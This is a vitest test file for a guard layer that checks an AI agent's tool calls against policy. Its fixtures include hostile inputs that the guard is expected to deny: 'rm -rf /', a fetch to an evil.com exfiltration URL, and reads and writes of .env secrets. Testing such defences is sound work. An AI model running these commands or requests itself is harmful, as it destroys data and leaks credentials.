// Tests for OpenClaw adapter
import { describe, it, expect, beforeEach } from 'vitest';
import {
  normalizeOpenClawAction,
  resolveOpenClawIdentity,
  buildGuardRequest,
  createOpenClawGuard,
  formatGuardDecision,
  OPENCLAW_DEFAULT_POLICY,
} from '@red-codes/adapter-openclaw';
import type { OpenClawToolCall, OpenClawContext, GuardRequest } from '@red-codes/adapter-openclaw';
import { createKernel } from '@red-codes/kernel';
import { resetActionCounter } from '@red-codes/core';
import { resetEventCounter } from '@red-codes/events';

beforeEach(() => {
  resetActionCounter();
  resetEventCounter();
});

// --- Normalization ---

describe('normalizeOpenClawAction', () => {
  it('normalizes file_read tool', () => {
    const toolCall: OpenClawToolCall = { tool: 'file_read', input: { path: 'src/index.ts' } };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.tool).toBe('Read');
    expect(action.file).toBe('src/index.ts');
    expect(action.agent).toBe('openclaw');
    expect(action.metadata).toHaveProperty('source', 'openclaw');
    expect(action.metadata).toHaveProperty('originalTool', 'file_read');
  });

  it('normalizes file_write tool', () => {
    const toolCall: OpenClawToolCall = {
      tool: 'file_write',
      input: { path: 'output.txt', content: 'hello world' },
    };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.tool).toBe('Write');
    expect(action.file).toBe('output.txt');
    expect(action.content).toBe('hello world');
  });

  it('normalizes shell_exec tool', () => {
    const toolCall: OpenClawToolCall = { tool: 'shell_exec', input: { command: 'ls -la' } };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.tool).toBe('Bash');
    expect(action.command).toBe('ls -la');
    expect(action.target).toBe('ls -la');
  });

  it('truncates long shell commands in target', () => {
    const longCmd = 'echo ' + 'a'.repeat(200);
    const toolCall: OpenClawToolCall = { tool: 'shell_exec', input: { command: longCmd } };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.target).toHaveLength(100);
    expect(action.command).toBe(longCmd);
  });

  it('normalizes http_fetch tool', () => {
    const toolCall: OpenClawToolCall = {
      tool: 'http_fetch',
      input: { url: 'https://example.com/api' },
    };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.tool).toBe('WebFetch');
    expect(action.target).toBe('https://example.com/api');
  });

  it('handles unknown tools with fallback', () => {
    const toolCall: OpenClawToolCall = {
      tool: 'custom_action',
      input: { target: 'some-target', data: 123 },
    };
    const action = normalizeOpenClawAction(toolCall);
    expect(action.tool).toBe('custom_action');
    expect(action.target).toBe('some-target');
    expect(action.metadata).toHaveProperty('originalTool', 'custom_action');
    expect(action.metadata).toHaveProperty('input');
  });

  it('propagates context metadata', () => {
    const toolCall: OpenClawToolCall = { tool: 'file_read', input: { path: 'test.ts' } };
    const context: OpenClawContext = {
      sessionId: 'sess-123',
      workspaceId: 'ws-456',
      actor: 'user@example.com',
      pluginId: 'my-plugin',
    };
    const action = normalizeOpenClawAction(toolCall, context);
    expect(action.metadata).toHaveProperty('sessionId', 'sess-123');
    expect(action.metadata).toHaveProperty('workspaceId', 'ws-456');
    expect(action.metadata).toHaveProperty('pluginId', 'my-plugin');
  });
});

// --- Identity ---

describe('resolveOpenClawIdentity', () => {
  it('returns openclaw when no context', () => {
    expect(resolveOpenClawIdentity()).toBe('openclaw');
    expect(resolveOpenClawIdentity(undefined)).toBe('openclaw');
  });

  it('returns openclaw for empty context', () => {
    expect(resolveOpenClawIdentity({})).toBe('openclaw');
  });

  it('uses actor for identity when provided', () => {
    const identity = resolveOpenClawIdentity({ actor: 'user@example.com' });
    expect(identity).toMatch(/^openclaw:[a-z0-9]+$/);
  });

  it('falls back to sessionId when no actor', () => {
    const identity = resolveOpenClawIdentity({ sessionId: 'sess-123' });
    expect(identity).toMatch(/^openclaw:[a-z0-9]+$/);
  });

  it('produces consistent hashes', () => {
    const a = resolveOpenClawIdentity({ actor: 'user@example.com' });
    const b = resolveOpenClawIdentity({ actor: 'user@example.com' });
    expect(a).toBe(b);
  });

  it('produces different hashes for different actors', () => {
    const a = resolveOpenClawIdentity({ actor: 'alice' });
    const b = resolveOpenClawIdentity({ actor: 'bob' });
    expect(a).not.toBe(b);
  });
});

// --- GuardRequest ---

describe('buildGuardRequest', () => {
  it('builds request with source openclaw', () => {
    const toolCall: OpenClawToolCall = { tool: 'file_read', input: { path: 'test.ts' } };
    const request = buildGuardRequest(toolCall, { sessionId: 'sess-1', actor: 'alice' });
    expect(request.source).toBe('openclaw');
    expect(request.toolName).toBe('file_read');
    expect(request.args).toEqual({ path: 'test.ts' });
    expect(request.sessionId).toBe('sess-1');
    expect(request.actor).toBe('alice');
  });

  it('works without context', () => {
    const toolCall: OpenClawToolCall = { tool: 'shell_exec', input: { command: 'ls' } };
    const request = buildGuardRequest(toolCall);
    expect(request.source).toBe('openclaw');
    expect(request.sessionId).toBeUndefined();
    expect(request.actor).toBeUndefined();
  });
});

// --- Integration: kernel round-trip ---

describe('Integration: OpenClaw → Kernel', () => {
  it('allows safe file read', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'file_read',
      input: { path: 'src/index.ts' },
    });

    expect(result.decision.allowed).toBe(true);
    expect(result.decision.severity).toBe('low');
    expect(result.request.source).toBe('openclaw');
    expect(result.events.length).toBeGreaterThan(0);
  });

  it('denies .env file read via invariant', async () => {
    const kernel = createKernel({ dryRun: true });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'file_write',
      input: { path: '.env', content: 'SECRET=leaked' },
    });

    expect(result.decision.allowed).toBe(false);
    // Denied by invariant (credential file creation or secret exposure)
    expect(result.decision.reason.toLowerCase()).toMatch(/credential|secret/);
    expect(result.decision.severity).not.toBe('low');
  });

  it('denies destructive shell command', async () => {
    const kernel = createKernel({ dryRun: true });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'shell_exec',
      input: { command: 'rm -rf /' },
    });

    expect(result.decision.allowed).toBe(false);
  });

  it('allows safe shell command', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'shell_exec',
      input: { command: 'ls -la' },
    });

    expect(result.decision.allowed).toBe(true);
  });

  it('events contain openclaw source metadata', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall(
      { tool: 'file_read', input: { path: 'README.md' } },
      { sessionId: 'test-session' }
    );

    const requestedEvent = result.events.find((e) => e.kind === 'ActionRequested');
    expect(requestedEvent).toBeDefined();
    expect((requestedEvent as Record<string, unknown>).agentId).toMatch(/^openclaw:/);
  });

  it('agent identity propagates through kernel', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall(
      { tool: 'file_read', input: { path: 'test.ts' } },
      { actor: 'agent-007' }
    );

    expect(result.decision.allowed).toBe(true);
    const requestedEvent = result.events.find((e) => e.kind === 'ActionRequested');
    expect((requestedEvent as Record<string, unknown>).agentId).toMatch(/^openclaw:[a-z0-9]+$/);
  });
});

// --- Integration with default policy ---

describe('Integration: OpenClaw → Kernel with default policy', () => {
  it('denies http.request with default policy', async () => {
    const kernel = createKernel({
      dryRun: true,
      policyDefs: [OPENCLAW_DEFAULT_POLICY],
    });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'http_fetch',
      input: { url: 'https://evil.com/exfil' },
    });

    expect(result.decision.allowed).toBe(false);
    expect(result.decision.reason).toContain('egress');
  });

  it('allows safe file read with default policy', async () => {
    const kernel = createKernel({
      dryRun: true,
      policyDefs: [OPENCLAW_DEFAULT_POLICY],
    });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({
      tool: 'file_read',
      input: { path: 'src/app.ts' },
    });

    expect(result.decision.allowed).toBe(true);
  });

  it('denies .env access with default policy', async () => {
    const kernel = createKernel({
      dryRun: true,
      policyDefs: [OPENCLAW_DEFAULT_POLICY],
    });
    const guard = createOpenClawGuard(kernel);

    const result = await guard.evaluateToolCall({ tool: 'file_read', input: { path: '.env' } });

    // Denied by either policy scope or invariant
    expect(result.decision.allowed).toBe(false);
  });
});

// --- evaluate() convenience method ---

describe('evaluate()', () => {
  it('accepts a pre-built GuardRequest', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const guard = createOpenClawGuard(kernel);

    const request: GuardRequest = {
      toolName: 'file_read',
      args: { path: 'src/main.ts' },
      source: 'openclaw',
      actor: 'test-agent',
    };

    const result = await guard.evaluate(request);
    expect(result.decision.allowed).toBe(true);
    expect(result.request).toEqual(request);
  });
});

// --- formatGuardDecision ---

describe('formatGuardDecision', () => {
  it('formats allowed decision', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const result = await kernel.propose({ tool: 'Read', file: 'test.ts', agent: 'test' });
    const decision = formatGuardDecision(result);
    expect(decision.allowed).toBe(true);
    expect(decision.severity).toBe('low');
  });

  it('formats denied decision with violations', async () => {
    const kernel = createKernel({ dryRun: true, policyDefs: [OPENCLAW_DEFAULT_POLICY] });
    const result = await kernel.propose({
      tool: 'Bash',
      command: 'rm -rf /',
      agent: 'test',
    });
    const decision = formatGuardDecision(result);
    expect(decision.allowed).toBe(false);
    expect(decision.severity).not.toBe('low');
  });
});

// --- Default policy shape ---

describe('OPENCLAW_DEFAULT_POLICY', () => {
  it('has expected structure', () => {
    expect(OPENCLAW_DEFAULT_POLICY.id).toBe('openclaw-default-v1');
    expect(OPENCLAW_DEFAULT_POLICY.rules.length).toBeGreaterThan(0);
    expect(OPENCLAW_DEFAULT_POLICY.severity).toBe(4);
  });

  it('has deny rules for filesystem, shell, and network', () => {
    const denyRules = OPENCLAW_DEFAULT_POLICY.rules.filter((r) => r.effect === 'deny');
    expect(denyRules.length).toBeGreaterThanOrEqual(4);

    const actions = denyRules.flatMap((r) => (Array.isArray(r.action) ? r.action : [r.action]));
    expect(actions).toContain('http.request');
    expect(actions).toContain('shell.exec');
  });
});
